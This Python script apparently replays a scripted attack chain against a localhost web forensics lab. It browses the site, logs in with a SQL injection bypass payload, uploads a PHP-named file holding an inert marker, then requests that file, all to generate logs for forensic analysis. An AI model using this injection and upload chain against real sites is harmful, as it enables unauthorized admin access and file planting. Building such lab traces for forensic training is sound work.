"""Replay the fixed localhost-only Scenario F authentication chain."""

import argparse
import http.cookiejar
import time
import urllib.error
import urllib.parse
import urllib.request

from common import STEP_DELAY_SECONDS, finish_scenario, start_fresh_lab

USER_AGENT = "webforensics-lab/1.0 scenario-f"
MARKER_NAME = "scenario-f-marker.php"
MARKER_CONTENT = b"LAB-FORENSICS-MARKER-F-v1\n"


def _request(
    opener: urllib.request.OpenerDirector,
    url: str,
    *,
    data: bytes | None = None,
    content_type: str | None = None,
    expected_status: int = 200,
) -> bytes:
    headers = {"User-Agent": USER_AGENT}
    if content_type:
        headers["Content-Type"] = content_type
    request = urllib.request.Request(url, data=data, headers=headers)
    try:
        with opener.open(request, timeout=10) as response:
            status = response.status
            body = response.read()
    except urllib.error.HTTPError as response:
        status = response.code
        body = response.read()
    except urllib.error.URLError as exc:
        raise RuntimeError(f"localhost lab request failed for {url}: {exc}") from exc
    if status != expected_status:
        raise RuntimeError(f"expected HTTP {expected_status}, received {status} for {url}")
    return body


def run(port: int) -> None:
    base_url = f"http://127.0.0.1:{port}"
    start_fresh_lab()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
    )

    def browse_home() -> None:
        _request(opener, f"{base_url}/")

    def browse_product() -> None:
        _request(opener, f"{base_url}/product.php?id=1")

    def view_login_form() -> None:
        _request(opener, f"{base_url}/admin/login.php")

    def failed_normal_login() -> None:
        query = urllib.parse.urlencode({"username": "admin", "password": "wrong-lab-password"})
        body = _request(
            opener,
            f"{base_url}/admin/login.php?{query}",
            expected_status=401,
        )
        if b"Login failed" not in body:
            raise RuntimeError("normal login did not fail as expected")

    def sqli_login_bypass() -> None:
        username = "admin" + "' OR " + "'1'='1" + " -- "
        query = urllib.parse.urlencode({"username": username, "password": ""})
        body = _request(opener, f"{base_url}/admin/login.php?{query}")
        if b"Login successful" not in body:
            raise RuntimeError("SQLi login replay did not establish the lab session")

    def upload_marker() -> None:
        boundary = "----webforensics-lab-scenario-f"
        body = (
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="{MARKER_NAME}"\r\n'
                "Content-Type: application/octet-stream\r\n\r\n"
            ).encode()
            + MARKER_CONTENT
            + f"\r\n--{boundary}--\r\n".encode()
        )
        response = _request(
            opener,
            f"{base_url}/admin/auth_upload.php",
            data=body,
            content_type=f"multipart/form-data; boundary={boundary}",
        )
        if b"/uploads/scenario-f-marker.php" not in response:
            raise RuntimeError("authenticated upload did not confirm the marker path")

    def request_marker() -> None:
        response = _request(opener, f"{base_url}/uploads/{MARKER_NAME}")
        if response != MARKER_CONTENT:
            raise RuntimeError("marker request did not return the expected inert text")

    steps = (
        browse_home,
        browse_product,
        view_login_form,
        failed_normal_login,
        sqli_login_bypass,
        upload_marker,
        request_marker,
    )
    for index, step in enumerate(steps):
        step()
        if index < len(steps) - 1:
            time.sleep(STEP_DELAY_SECONDS)
    finish_scenario()
    print(
        "Scenario F replay complete: 7 spaced localhost requests; "
        "SQLi enabled authenticated upload."
    )


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()
    if not 1 <= args.port <= 65535:
        parser.error("port must be between 1 and 65535")
    run(args.port)


if __name__ == "__main__":
    main()
